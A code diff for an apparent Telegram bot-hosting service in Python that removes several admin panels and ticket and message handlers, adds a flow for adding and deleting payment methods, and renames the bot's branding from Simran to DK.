-        f"{bullet('Sandboxes',    f'{sandbox_dirs} dirs, {sandbox_size / 1024 / 1024:.1f} MB')}\n"
-        f"{bullet('Cache entries', len(_DB_CACHE))}\n"
-        f"{bullet('PID',          os.getpid())}\n"
-        f"{G['div']}{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["admin"], cap, _set_back_kb(), call=call)
-
-
-def render_adm_plans(call: types.CallbackQuery) -> None:
-    """Live plan editor — adjust max_bots per plan tier."""
-    rows = []
-    for k, v in PLAN_LIMITS.items():
-        live = int(get_setting(f"plan_max_bots_{k}", v["max_bots"]))
-        rows.append(f"{bullet(v['name'], f'max_bots = {live}')}")
-    cap = (
-        f"<b>{G['diamond']} {sc('Plans Editor')}</b>\n"
-        f"{G['div_eq']}\n"
-        + "\n".join(rows) + "\n"
-        f"{G['div']}\n"
-        f"<i>{sc('Tap a plan to bump its bot quota')}.</i>{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup(row_width=3)
-    for k, v in PLAN_LIMITS.items():
-        live = int(get_setting(f"plan_max_bots_{k}", v["max_bots"]))
-        kb.add(
-            Btn(f"➖ {sc(v['name'])}",
-                                       callback_data=f"adm_set_plan_dec_{k}"),
-            Btn(f"{live}",
-                                       callback_data=f"adm_set_plan_show_{k}"),
-            Btn(f"➕ {sc(v['name'])}",
-                                       callback_data=f"adm_set_plan_inc_{k}"),
-        )
-    kb.add(Btn(
-        f"{G['refresh']}  {sc('Reset Defaults')}",
-        callback_data="adm_set_plans_reset"))
-    kb.add(Btn(
-        f"{G['back']}  {sc('Settings')}", callback_data="adm_settings"))
-    show_menu(call.message.chat.id, PHOTOS["admin"], cap, kb, call=call)
-
-
-def render_adm_confirm(call: types.CallbackQuery, action: str, label: str) -> None:
-    cap = (
-        f"<b>{G['warn']} {sc('Confirm')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{sc('You are about to')}: <b>{esc(label)}</b>.\n"
-        f"{sc('This affects every running bot. Continue')}?{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup(row_width=2)
-    kb.add(
-        Btn(f"{G['ok']}  {sc('Yes, do it')}",
-                                   callback_data=f"{action}_yes"),
-        Btn(f"{G['no']}  {sc('Cancel')}",
-                                   callback_data="adm_settings"),
-    )
-    show_menu(call.message.chat.id, PHOTOS["admin"], cap, kb, call=call)
-
-
-def render_adm_confirm_custom(call: types.CallbackQuery, action: str,
-                              label: str, back_cb: str = "menu_admin") -> None:
-    cap = (
-        f"<b>{G['warn']} {sc('Confirm')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{sc('You are about to')}: <b>{esc(label)}</b>.\n"
-        f"{sc('Are you sure')}?{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup(row_width=2)
-    kb.add(
-        Btn(f"{G['ok']}  {sc('Yes')}",    callback_data=action,  style="danger"),
-        Btn(f"{G['no']}  {sc('Cancel')}", callback_data=back_cb, style="primary"),
-    )
-    show_menu(call.message.chat.id, PHOTOS["admin"], cap, kb, call=call)
-
-
-# ═══════════════════════════════════════════════════════════════════
-#  ADVANCED ADMIN SUB-PANELS  (35+ new features)
-# ═══════════════════════════════════════════════════════════════════
 
 def _adm_back(dest: str = "menu_admin") -> types.InlineKeyboardMarkup:
     kb = types.InlineKeyboardMarkup()
@@ -8107,7 +5081,7 @@ def _gh_api(endpoint: str, token: Optional[str] = None,
     req = _ur.Request(url, method=method, data=body)
     req.add_header("Authorization", f"token {tok}")
     req.add_header("Accept",        "application/vnd.github.v3+json")
-    req.add_header("User-Agent",    "SimranHostingBot/2.0")
+    req.add_header("User-Agent",    "DKHostingBot/2.0")
     if body:
         req.add_header("Content-Type", "application/json")
     with _ur.urlopen(req, timeout=15) as resp:
@@ -8120,41 +5094,6 @@ def _gh_api_safe(endpoint: str, token: Optional[str] = None) -> Tuple[bool, Any]
         return True, _gh_api(endpoint, token)
     except Exception as e:
         return False, str(e)
-
-
-def render_adm_gh_browser(call: types.CallbackQuery) -> None:
-    """GitHub File Browser — main landing panel."""
-    has_token = bool(GH.get("token"))
-    has_repo  = bool(GH.get("repo"))
-    cur_repo  = GH.get("repo") or "—"
-    cur_branch= GH.get("branch") or "main"
-    cap = (
-        f"<b>🐙 {sc('GitHub File Browser')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Token',  '✅ Set' if has_token else '❌ Not set')}\n"
-        f"{bullet('Repo',   esc(cur_repo))}\n"
-        f"{bullet('Branch', esc(cur_branch))}\n"
-        f"{G['div']}\n"
-        f"<i>{sc('Browse and run files directly from any GitHub repo. Works with public and private repos (with token).')}  </i>{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup(row_width=2)
-    if has_token:
-        kb.add(Btn("📂  Bʀᴏᴡꜱᴇ Mʏ Rᴇᴘᴏꜱ",  callback_data="adm_gh_repos",        style="success"))
-        if has_repo:
-            kb.add(Btn(f"📁  {esc(cur_repo)[:25]}",  callback_data="adm_gh_browse_repo", style="primary"))
-    kb.add(
-        Btn("🔑  Sᴇᴛ Tᴏᴋᴇɴ",       callback_data="gh_set_token",   style="primary"),
-        Btn("📦  Sᴇᴛ Rᴇᴘᴏ",         callback_data="gh_set_repo",    style="primary"),
-    )
-    kb.add(
-        Btn("🌿  Sᴇᴛ Bʀᴀɴᴄʜ",       callback_data="gh_set_branch",  style="primary"),
-        Btn("🔄  Rᴇꜰʀᴇꜱʜ",          callback_data="adm_gh_refresh_repos", style="primary"),
-    )
-    kb.add(
-        Btn("📊  Gɪᴛʜᴜʙ Bᴀᴄᴋᴜᴘ",   callback_data="adm_github",     style="primary"),
-        Btn(f"{G['back']}  Aᴅᴍɪɴ",  callback_data="menu_admin",     style="primary"),
-    )
-    show_menu(call.message.chat.id, PHOTOS.get("gh_browser", PHOTOS["admin"]), cap, kb, call=call)
 
 
 def render_adm_gh_repos(call: types.CallbackQuery, force: bool = False) -> None:
@@ -8495,6 +5434,7 @@ def render_adm_pay_methods(call: types.CallbackQuery) -> None:
             Btn(f"{'✅' if enabled else '❌'} {esc(m['name'])}",
                 callback_data=f"adm_pay_edit_{key}", style="primary"),
         )
+    kb.add(Btn("➕  Aᴅᴅ Mᴇᴛʜᴏᴅ", callback_data="adm_pay_method_add", style="success"))
     kb.add(Btn(f"{G['back']}  Pᴀʏ Cᴏɴꜰɪɢ", callback_data="adm_pay_config", style="primary"))
     show_menu(call.message.chat.id, PHOTOS.get("pay_config", PHOTOS["admin"]), cap, kb, call=call)
 
@@ -8522,6 +5462,12 @@ def render_adm_pay_method_edit(call: types.CallbackQuery, key: str) -> None:
             style="danger" if enabled else "success"),
         Btn("✏️  Cʜᴀɴɢᴇ Nᴜᴍʙᴇʀ",
             callback_data=f"adm_pay_method_setnumber_{key}", style="primary"),
+    )
+    kb.add(
+        Btn("📝  Iɴꜱᴛʀᴜᴄᴛɪᴏɴꜱ",
+            callback_data=f"adm_pay_method_setistr_{key}", style="primary"),
+        Btn("🗑  Dᴇʟᴇᴛᴇ",
+            callback_data=f"adm_pay_method_del_{key}", style="danger"),
     )
     kb.add(Btn(f"{G['back']}  Pᴀʏ Mᴇᴛʜᴏᴅꜱ", callback_data="adm_pay_methods", style="primary"))
     show_menu(call.message.chat.id, PHOTOS.get("pay_config", PHOTOS["admin"]), cap, kb, call=call)
@@ -8636,6 +5582,144 @@ def action_adm_pay_method_number(call: types.CallbackQuery, data: str) -> None:
                          f"<b>{esc(PAYMENT_METHODS.get(key,{}).get('name',key))}</b>:",
                          parse_mode="HTML")
         return
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# PAYMENT METHOD ADD / DELETE / INSTRUCTIONS
+# ─────────────────────────────────────────────────────────────────────────────
+
+def render_adm_pay_method_add(call: types.CallbackQuery) -> None:
+    """Show method-type picker so admin can add a new payment method."""
+    cap = (
+        f"<b>💳 {sc('Add Payment Method')}</b>\n"
+        f"{G['div_eq']}\n"
+        f"{sc('Choose the type of payment method to add')}:{FOOTER}"
+    )
+    kb = types.InlineKeyboardMarkup(row_width=2)
+    kb.add(
+        Btn("🏦  Bank Transfer",  callback_data="adm_pay_method_addtype_bank_transfer", style="primary"),
+        Btn("📱  UPI",            callback_data="adm_pay_method_addtype_upi",          style="primary"),
+    )
+    kb.add(
+        Btn("🔶  Binance Pay",   callback_data="adm_pay_method_addtype_binance",       style="primary"),
+        Btn("📲  Mobile Money",  callback_data="adm_pay_method_addtype_mobile_money",  style="primary"),
+    )
+    kb.add(Btn(f"{G['back']}  Pᴀʏ Mᴇᴛʜᴏᴅꜱ", callback_data="adm_pay_methods", style="primary"))
+    show_menu(call.message.chat.id, PHOTOS.get("pay_config", PHOTOS["admin"]), cap, kb, call=call)
+
+
+def render_adm_pay_method_addtype(call: types.CallbackQuery, method_type: str) -> None:
+    """Start the multi-step flow for adding a new payment method."""
+    type_labels = {
+        "bank_transfer": "Bank Transfer",
+        "upi":           "UPI",
+        "binance":       "Binance Pay",
+        "mobile_money":  "Mobile Money",
+    }
+    label = type_labels.get(method_type, method_type.replace("_", " ").title())
+    USER_STATES[call.from_user.id] = {
+        "flow":        "await_adm_pm_add_name",
+        "pm_type":     method_type,
+        "pm_type_label": label,
+    }
+    bot.send_message(
+        call.message.chat.id,
+        f"💳 <b>{sc('Adding')} {esc(label)}</b>\n"
+        f"{G['div']}\n"
+        f"{sc('Step 1/3')}: {sc('Send a short display name for this method')}\n"
+        f"<i>{sc('e.g.')}: <code>My UPI</code>, <code>Company Bank</code></i>",
+        parse_mode="HTML"
+    )
+
+
+def render_adm_pay_method_del_confirm(call: types.CallbackQuery, key: str) -> None:
+    """Ask for confirmation before deleting a payment method."""
+    m = PAYMENT_METHODS.get(key)
+    if not m:
+        ack(call, "Method not found"); return
+    cap = (
+        f"<b>🗑 {sc('Delete')} {esc(m['name'])}?</b>\n"
+        f"{G['div']}\n"
+        f"{sc('This will permanently remove this payment method.')}\n"
+        f"{sc('Existing payment requests already using this method are not affected.')}{FOOTER}"
+    )
+    kb = types.InlineKeyboardMarkup(row_width=2)
+    kb.add(
+        Btn(f"🗑  {sc('Yes, delete')}",    callback_data=f"adm_pay_method_delyes_{key}", style="danger"),
+        Btn(f"❌  {sc('Cancel')}",         callback_data=f"adm_pay_edit_{key}",           style="primary"),
+    )
+    show_menu(call.message.chat.id, PHOTOS.get("pay_config", PHOTOS["admin"]), cap, kb, call=call)
+
+
+def action_adm_pay_method_delete(call: types.CallbackQuery, key: str) -> None:
+    """Delete a payment method from PAYMENT_METHODS and persist."""
+    if not is_owner(call.from_user.id):
+        ack(call, "Owner only"); return
+    m = PAYMENT_METHODS.pop(key, None)
+    if not m:
+        ack(call, "Method not found"); return
+    # Persist custom methods list
+    custom = get_setting("custom_payment_methods", {}) or {}
+    custom.pop(key, None)
+    set_setting("custom_payment_methods", custom)
+    # Also clean up any per-method settings
+    for suffix in ("enabled", "number", "instructions", "label"):
+        set_setting(f"pm_{suffix}_{key}", None)
+    audit(call.from_user.id, "pm_delete", f"key={key} name={m.get('name','?')}")
+    ack(call, f"Deleted: {m.get('name', key)}")
+    render_adm_pay_methods(call)
+
+
+def _start_pay_method_set_instructions(call: types.CallbackQuery, key: str) -> None:
+    """Start flow to update payment instructions for a method."""
+    m = PAYMENT_METHODS.get(key)
+    if not m:
+        ack(call, "Method not found"); return
+    USER_STATES[call.from_user.id] = {"flow": "await_adm_pm_instructions", "pm_key": key}
+    bot.send_message(
+        call.message.chat.id,
+        f"📝 <b>{sc('Payment Instructions for')} {esc(m['name'])}</b>\n"
+        f"{G['div']}\n"
+        f"{sc('Send the instructions text shown to users when they select this method.')}",
+        parse_mode="HTML"
+    )
+
+
+def _pm_add_finalize(uid: int, state: dict) -> None:
+    """Called after admin confirms all details; saves the new method."""
+    import re, time as _time
+    name      = state.get("pm_name", "").strip()
+    number    = state.get("pm_number", "").strip()
+    istr      = state.get("pm_instructions", "").strip()
+    pm_type   = state.get("pm_type", "custom")
+    # Generate a stable key from name
+    key = re.sub(r"[^a-z0-9]", "_", name.lower())[:20].strip("_") or f"pm_{int(_time.time())}"
+    # Avoid collision
+    base_key = key
+    n = 1
+    while key in PAYMENT_METHODS:
+        key = f"{base_key}_{n}"; n += 1
+    PAYMENT_METHODS[key] = {
+        "name":         name,
+        "number":       number,
+        "type":         pm_type.replace("_", " ").title(),
+        "tag":          f"[{name[:3].upper()}]",
+        "instructions": istr,
+    }
+    # Persist custom methods
+    custom = get_setting("custom_payment_methods", {}) or {}
+    custom[key] = PAYMENT_METHODS[key]
+    set_setting("custom_payment_methods", custom)
+    set_setting(f"pm_enabled_{key}", True)
+    audit(uid, "pm_add", f"key={key} name={name}")
+
+
+def _pm_reload_custom() -> None:
+    """Load persisted custom payment methods into PAYMENT_METHODS on startup."""
+    custom = get_setting("custom_payment_methods", {}) or {}
+    for key, m in custom.items():
+        if key not in PAYMENT_METHODS:
+            PAYMENT_METHODS[key] = m
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -9359,7 +6443,7 @@ def action_adm_wh_test(call: types.CallbackQuery) -> None:
         try:
             import urllib.request as _ur
             import json as _j
-            payload = _j.dumps({"test": True, "ts": ts_iso(), "from": "SimranHostingBot"}).encode()
+            payload = _j.dumps({"test": True, "ts": ts_iso(), "from": "DKHostingBot"}).encode()
             req = _ur.Request(wh_url, data=payload, method="POST")
             req.add_header("Content-Type", "application/json")
             with _ur.urlopen(req, timeout=10) as resp:
@@ -9400,10 +6484,6 @@ def render_adm_wh_info(call: types.CallbackQuery) -> None:
 # ─────────────────────────────────────────────────────────────────────────────
 # FEATURE FLAGS
 # ─────────────────────────────────────────────────────────────────────────────
-
-def _ff_get(key: str) -> bool:
-    return bool(get_setting(f"ff_{key}", _FEATURE_FLAG_DEFAULTS.get(key, True)))
-
 
 def render_adm_feature_flags(call: types.CallbackQuery) -> None:
     rows = []
@@ -9769,19 +6849,6 @@ def _sched_check_and_run() -> None:
         except Exception:
             pass
         if True:  # always loop
-            pass
-
-
-def _sched_broadcast(msg: str) -> None:
-    """Send a scheduled broadcast to all users."""
-    users = db_load()["users"]
-    for uid in users:
-        try:
-            bot.send_message(int(uid),
-                             f"📣 <b>{sc('Scheduled Message')}</b>\n{G['div']}\n{esc(msg)}",
-                             parse_mode="HTML")
-            time.sleep(0.05)
-        except Exception:
             pass
 
 
@@ -10456,7 +7523,7 @@ def _do_export_data(admin_uid: int) -> Path:
     out = BASE_DIR / "exports"
     out.mkdir(exist_ok=True)
     stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
-    target = out / f"simran_export_{stamp}.zip"
+    target = out / f"dk_export_{stamp}.zip"
     with zipfile.ZipFile(target, "w", zipfile.ZIP_DEFLATED) as zf:
         for name in ("user_data.json", "settings.json", "audit.log",
                      "github_config.json"):
@@ -10474,905 +7541,6 @@ def _do_export_data(admin_uid: int) -> Path:
 
 # ═════════════════════════════════════════════════════════════════
 # 21. TICKETS
-# ═════════════════════════════════════════════════════════════════
-
-def render_user_tickets(call: types.CallbackQuery) -> None:
-    uid = call.from_user.id
-    d = db_load()["tickets"]
-    mine = [t for t in d.values() if t.get("uid") == uid][-10:]
-    rows = "\n".join(
-        f"{G['bullet']} <code>{t['id']}</code> {G['bullet']} {esc(t.get('status'))} "
-        f"{G['bullet']} {esc(t.get('subject'))[:40]}"
-        for t in mine
-    ) or f"<i>{sc('no tickets yet')}</i>"
-    cap = (
-        f"<b>{G['ticket']} {sc('Your Tickets')}</b>\n"
-        f"{G['div_eq']}\n{rows}\n{G['div']}{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup()
-    kb.add(Btn(
-        f"{G['plus']}  {sc('Open Ticket')}", callback_data="ticket_open"))
-    for t in mine:
-        kb.add(Btn(
-            f"{G['eye']}  #{t['id']}", callback_data=f"ticket_view_{t['id']}"))
-    kb.add(Btn(
-        f"{G['back']}  {sc('Main Menu')}", callback_data="menu_main"))
-    show_menu(call.message.chat.id, PHOTOS["ticket"], cap, kb, call=call)
-
-
-def start_ticket_flow(call: types.CallbackQuery) -> None:
-    USER_STATES[call.from_user.id] = {"flow": "await_ticket_subject"}
-    bot.send_message(call.message.chat.id,
-                     f"{G['ticket']} {sc('Send the subject of your ticket (one line)')}.")
-
-
-def render_ticket_view(call: types.CallbackQuery, tid: str) -> None:
-    d = db_load()
-    t = d["tickets"].get(tid)
-    if not t:
-        ack(call, "Not found"); return
-    if t["uid"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    msgs = "\n".join(
-        f"<b>{esc(m['from'])}</b>: {esc(m['text'])[:200]}"
-        for m in t.get("messages", [])
-    )
-    cap = (
-        f"<b>{G['ticket']} #{t['id']}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('From',    t['uid'])}\n"
-        f"{bullet('Status',  t['status'])}\n"
-        f"{bullet('Subject', t['subject'])}\n"
-        f"{G['div']}\n{msgs}\n{G['div']}{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup()
-    if t["status"] == "open":
-        kb.add(Btn(
-            f"{G['plus']}  {sc('Reply')}", callback_data=f"ticket_reply_{tid}"))
-        kb.add(Btn(
-            f"{G['no']}  {sc('Close')}", callback_data=f"ticket_close_{tid}"))
-    kb.add(Btn(
-        f"{G['back']}  {sc('Tickets')}",
-        callback_data="adm_tickets" if is_admin(call.from_user.id) else "menu_tickets"))
-    show_menu(call.message.chat.id, PHOTOS["ticket"], cap, kb, call=call)
-
-
-def start_ticket_reply(call: types.CallbackQuery, tid: str) -> None:
-    USER_STATES[call.from_user.id] = {"flow": "await_ticket_reply", "tid": tid}
-    bot.send_message(call.message.chat.id,
-                     f"{G['plus']} {sc('Send your reply now')}. /cancel {sc('to abort')}.")
-
-
-def action_ticket_close(call: types.CallbackQuery, tid: str) -> None:
-    d = db_load()
-    t = d["tickets"].get(tid)
-    if not t:
-        ack(call, "Not found"); return
-    if t["uid"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    t["status"] = "closed"
-    t["closed_at"] = ts_iso()
-    db_save(d)
-    audit(call.from_user.id, "ticket_close", f"tid={tid}")
-    try:
-        bot.send_message(t["uid"], f"<b>{G['ok']} {sc('Ticket closed')} #{tid}</b>")
-    except Exception:
-        pass
-    ack(call, "Closed")
-    render_ticket_view(call, tid)
-
-
-# ═════════════════════════════════════════════════════════════════
-# 22. MESSAGE/DOC HANDLERS  (state-driven flows)
-# ═════════════════════════════════════════════════════════════════
-
-@bot.message_handler(content_types=["document"])
-def on_document(m: types.Message) -> None:
-    if not _is_private(m):
-        return
-    if banned_block(m):
-        return
-    uid = m.from_user.id
-    if not RATE.allow(uid):
-        maybe_auto_ban(uid, "rate")
-        return
-    if not UPLOAD_RATE.allow(uid):
-        bot.reply_to(m, f"{G['warn']} {sc('Too many uploads, slow down')}.")
-        maybe_auto_ban(uid, "upload spam")
-        return
-    if maintenance_block(uid):
-        return
-    get_or_create_user(m.from_user)
-    if not require_verified(m.chat.id, uid):
-        return
-    st = USER_STATES.get(uid) or {}
-    if st.get("flow") == "await_payment_proof":
-        return _handle_payment_proof(m, st)
-    if st.get("flow") == "await_topup_proof":
-        return _handle_topup_proof(m)
-    # default: bot upload
-    _handle_bot_upload(m)
-
-
-@bot.message_handler(content_types=["photo"])
-def on_photo(m: types.Message) -> None:
-    if not _is_private(m):
-        return
-    if banned_block(m):
-        return
-    uid = m.from_user.id
-    if not RATE.allow(uid):
-        return
-    get_or_create_user(m.from_user)
-    if not require_verified(m.chat.id, uid):
-        return
-    st = USER_STATES.get(uid) or {}
-    # ── admin sent a banner replacement ──
-    if st.get("flow") == "await_admin_photo" and is_admin(uid):
-        key = st.get("photo_key") or ""
-        if key not in _PHOTO_SPECS:
-            bot.reply_to(m, f"{G['no']} {sc('Unknown photo key')}.")
-            USER_STATES.pop(uid, None)
-            return
-        try:
-            ph = m.photo[-1]
-            f = bot.get_file(ph.file_id)
-            raw = bot.download_file(f.file_path)
-        except Exception as e:
-            bot.reply_to(m, f"{G['no']} {sc('download error')}: <code>{esc(e)}</code>",
-                         parse_mode="HTML")
-            return
-        ok = replace_menu_photo(key, raw)
-        USER_STATES.pop(uid, None)
-        label = PHOTO_KEYS_FRIENDLY.get(key, key)
-        if ok:
-            audit(uid, "menu_photo_replace", f"key={key} bytes={len(raw)}")
-            bot.reply_to(
-                m,
-                f"<b>{G['ok']} {sc('Banner updated')}</b>\n"
-                f"{bullet('Menu', label)}\n"
-                f"{bullet('Size', fmt_bytes(len(raw)))}",
-                parse_mode="HTML",
-            )
-        else:
-            bot.reply_to(m, f"{G['no']} {sc('Failed to save photo')}.")
-        return
-    if st.get("flow") == "await_payment_proof":
-        _handle_payment_proof(m, st); return
-    if st.get("flow") == "await_topup_proof":
-        _handle_topup_proof(m); return
-
-
-@bot.message_handler(func=lambda m: True, content_types=["text"])
-def on_text(m: types.Message) -> None:
-    if not _is_private(m):
-        return
-    if banned_block(m):
-        return
-    uid = m.from_user.id
-    if not RATE.allow(uid):
-        maybe_auto_ban(uid, "rate")
-        return
-    text = (m.text or "").strip()
-    if text.startswith("/"):
-        return  # handled by command handlers
-    get_or_create_user(m.from_user)
-    if maintenance_block(uid):
-        return
-    if not require_verified(m.chat.id, uid):
-        return
-
-    st = USER_STATES.get(uid) or {}
-    flow = st.get("flow")
-    try:
-        if flow == "await_env_kv":
-            return _handle_env_kv(m, st)
-        if flow == "await_pip_install":
-            return _handle_pip_install(m, st)
-        if flow == "await_tunnel_port":
-            return _handle_tunnel_port(m, st)
-        if flow == "await_cron":
-            return _handle_cron(m, st)
-        if flow == "await_admin_finduser":
-            return _handle_admin_finduser(m)
-        if flow == "await_ban_cmd":
-            return _handle_ban_cmd(m)
-        if flow == "await_giveplan":
-            return _handle_giveplan_cmd(m)
-        if flow == "await_broadcast":
-            return _handle_broadcast(m)
-        if flow == "await_coupon":
-            return _handle_coupon_user(m)
-        if flow == "await_coupon_admin":
-            return _handle_coupon_admin(m)
-        if flow == "await_admin_admins":
-            return _handle_admin_admins(m)
-        if flow == "await_ticket_subject":
-            return _handle_ticket_subject(m)
-        if flow == "await_ticket_body":
-            return _handle_ticket_body(m, st)
-        if flow == "await_ticket_reply":
-            return _handle_ticket_reply(m, st)
-        if flow == "await_payment_proof":
-            return _handle_payment_proof_text(m, st)
-        if flow == "await_topup_proof":
-            return _handle_topup_proof(m)
-        if flow == "await_gift_target":
-            return _handle_gift_target(m, st)
-        if flow == "await_gift_confirm":
-            return _handle_gift_confirm(m, st)
-        if flow == "await_gh_token":
-            gh_set_config({"token": text}); gh_load_config()
-            USER_STATES.pop(uid, None); bot.reply_to(m, f"{G['ok']} {sc('token saved')}"); return
-        if flow == "await_gh_repo":
-            gh_set_config({"repo": text}); gh_load_config()
-            USER_STATES.pop(uid, None); bot.reply_to(m, f"{G['ok']} {sc('repo saved')}"); return
-        if flow == "await_gh_branch":
-            gh_set_config({"branch": text}); gh_load_config()
-            USER_STATES.pop(uid, None); bot.reply_to(m, f"{G['ok']} {sc('branch saved')}"); return
-        if flow == "await_gh_interval":
-            try:
-                v = max(15, int(text))
-            except Exception:
-                v = 360
-            gh_set_config({"intervalMin": v}); gh_load_config()
-            USER_STATES.pop(uid, None); bot.reply_to(m, f"{G['ok']} {sc('interval saved')}"); return
-        if flow == "await_set_brand":
-            if not is_owner(uid):
-                USER_STATES.pop(uid, None); return
-            new = (text or "").strip()[:64]
-            if not new:
-                bot.reply_to(m, f"{G['no']} {sc('empty — cancelled')}")
-                USER_STATES.pop(uid, None); return
-            global BRAND_TAG
-            BRAND_TAG = new
-            set_setting("brand_tag", new)
-            audit(uid, "set_brand", new)
-            USER_STATES.pop(uid, None)
-            bot.reply_to(m, f"{G['ok']} {sc('Brand updated to')}: <b>{esc(new)}</b>",
-                         parse_mode="HTML")
-            return
-        if flow == "await_set_announce":
-            if not is_owner(uid):
-                USER_STATES.pop(uid, None); return
-            v = (text or "").strip()
-            if v == "-" or not v:
-                v = ""
-            elif not v.startswith("@") and not v.lstrip("-").isdigit():
-                bot.reply_to(m, f"{G['no']} {sc('use @handle or numeric chat id, or - to clear')}")
-                return
-            global ANNOUNCE_CHANNEL
-            ANNOUNCE_CHANNEL = v
-            set_setting("announce_channel", v)
-            audit(uid, "set_announce", v or "(cleared)")
-            USER_STATES.pop(uid, None)
-            bot.reply_to(m, f"{G['ok']} {sc('Announce channel set to')}: "
-                            f"<code>{esc(v) if v else '—'}</code>",
-                         parse_mode="HTML")
-            return
-        if flow == "await_set_owner":
-            if not is_owner(uid):
-                USER_STATES.pop(uid, None); return
-            try:
-                new_owner = int((text or "").strip())
-                if new_owner <= 0:
-                    raise ValueError
-            except Exception:
-                bot.reply_to(m, f"{G['no']} {sc('invalid id — send a positive integer')}")
-                return
-            global OWNER_ID
-            OWNER_ID = new_owner
-            set_setting("owner_id", new_owner)
-            audit(uid, "transfer_owner", f"new={new_owner}")
-            USER_STATES.pop(uid, None)
-            bot.reply_to(m,
-                f"{G['ok']} {sc('Ownership transferred to')} <code>{new_owner}</code>.\n"
-                f"<i>{sc('You are no longer the owner. New owner can use')} /start.</i>",
-                parse_mode="HTML")
-            return
-
-        # ── New advanced admin flows ──────────────────────────────────
-        if flow == "await_set_footer":
-            if not is_owner(uid):
-                USER_STATES.pop(uid, None); return
-            v = (text or "").strip()
-            set_setting("custom_footer", "" if v == "-" else v)
-            audit(uid, "set_footer", v)
-            USER_STATES.pop(uid, None)
-            bot.reply_to(m, f"{G['ok']} {sc('Footer updated')}.")
-            return
-
-        if flow == "await_set_welcome":
-            if not is_owner(uid):
-                USER_STATES.pop(uid, None); return
-            set_setting("custom_welcome", (text or "").strip())
-            audit(uid, "set_welcome", "")
-            USER_STATES.pop(uid, None)
-            bot.reply_to(m, f"{G['ok']} {sc('Welcome message updated')}.")
-            return
-
-        if flow == "await_set_rules":
-            if not is_owner(uid):
-                USER_STATES.pop(uid, None); return
-            set_setting("hosting_rules", (text or "").strip())
-            audit(uid, "set_rules", "")
-            USER_STATES.pop(uid, None)
-            bot.reply_to(m, f"{G['ok']} {sc('Hosting rules updated')}.")
-            return
-
-        if flow == "await_adm_user_search":
-            if not is_admin(uid):
-                USER_STATES.pop(uid, None); return
-            q = (text or "").strip().lstrip("@").lower()
-            d = db_load()
-            results = []
-            for _uid, u in d["users"].items():
-                if (q.isdigit() and _uid == q) or \
-                   q in str(u.get("username", "")).lower() or \
-                   q in str(u.get("name", "")).lower():
-                    bot_count = sum(1 for b in d["bots"].values() if str(b.get("owner")) == _uid)
-                    results.append(
-                        f"{G['bullet']} <code>{_uid}</code> "
-                        f"<b>{esc(u.get('name','?'))}</b> "
-                        f"@{esc(u.get('username','—'))} "
-                        f"plan={u.get('plan','free')} "
-                        f"bots={bot_count} "
-                        f"wallet={u.get('wallet',0)}৳ "
-                        f"{'🚫banned' if u.get('banned') else ''}"
-                    )
-            USER_STATES.pop(uid, None)
-            reply = ("\n".join(results[:10]) or f"<i>{sc('No users found for')}: {esc(q)}</i>")
-            bot.reply_to(m, f"<b>🔍 {sc('Search Results')}</b>\n{G['div_eq']}\n{reply}",
-                         parse_mode="HTML")
-            return
-
-        if flow == "await_adm_wallet_adjust":
-            if not is_admin(uid):
-                USER_STATES.pop(uid, None); return
-            parts = (text or "").strip().split(None, 1)
-            if len(parts) < 2:
-                bot.reply_to(m, f"{G['no']} {sc('Format')}: <code>uid +/-/=amount</code>",
-                             parse_mode="HTML"); return
-            target_uid, op_str = parts[0].strip(), parts[1].strip()
-            d = db_load()
-            if target_uid not in d["users"]:
-                bot.reply_to(m, f"{G['no']} {sc('User not found')}."); return
-            u = d["users"][target_uid]
-            try:
-                cur = float(u.get("wallet", 0))
-                if op_str.startswith("+"):
-                    new_bal = cur + float(op_str[1:])
-                elif op_str.startswith("-"):
-                    new_bal = max(0, cur - float(op_str[1:]))
-                elif op_str.startswith("="):
-                    new_bal = float(op_str[1:])
-                else:
-                    new_bal = float(op_str)
-                u["wallet"] = round(new_bal, 2)
-                db_save(d)
-                audit(uid, "wallet_adjust", f"uid={target_uid} old={cur} new={new_bal}")
-                USER_STATES.pop(uid, None)
-                bot.reply_to(m, f"{G['ok']} uid <code>{target_uid}</code> wallet: "
-                                f"<b>{cur}৳</b> → <b>{new_bal}৳</b>",
-                             parse_mode="HTML")
-            except Exception as _we:
-                bot.reply_to(m, f"{G['no']} {sc('Error')}: <code>{esc(_we)}</code>",
-                             parse_mode="HTML")
-            return
-
-        if flow == "await_adm_notify_user":
-            if not is_admin(uid):
-                USER_STATES.pop(uid, None); return
-            parts = (text or "").split(None, 1)
-            if len(parts) < 2:
-                bot.reply_to(m, f"{G['no']} {sc('Format')}: <code>user_id message</code>",
-                             parse_mode="HTML"); return
-            target_uid_str, msg_text = parts[0].strip(), parts[1].strip()
-            USER_STATES.pop(uid, None)
-            try:
-                bot.send_message(int(target_uid_str),
-                                 f"<b>📨 {sc('Message from Admin')}</b>\n{G['div']}\n{esc(msg_text)}",
-                                 parse_mode="HTML")
-                audit(uid, "notify_user", f"to={target_uid_str}")
-                bot.reply_to(m, f"{G['ok']} {sc('Message sent')}.")
-            except Exception as _ne:
-                bot.reply_to(m, f"{G['no']} {sc('Failed')}: <code>{esc(_ne)}</code>",
-                             parse_mode="HTML")
-            return
-
-        if flow == "await_adm_user_reset":
-            if not is_owner(uid):
-                USER_STATES.pop(uid, None); return
-            target_uid_str = (text or "").strip()
-            d = db_load()
-            if target_uid_str not in d["users"]:
-                bot.reply_to(m, f"{G['no']} {sc('User not found')}."); return
-            # Stop all their bots
-            for b in list(d["bots"].values()):
-                if str(b.get("owner")) == target_uid_str:
-                    try:
-                        stop_child(b["_id"])
-                    except Exception:
-                        pass
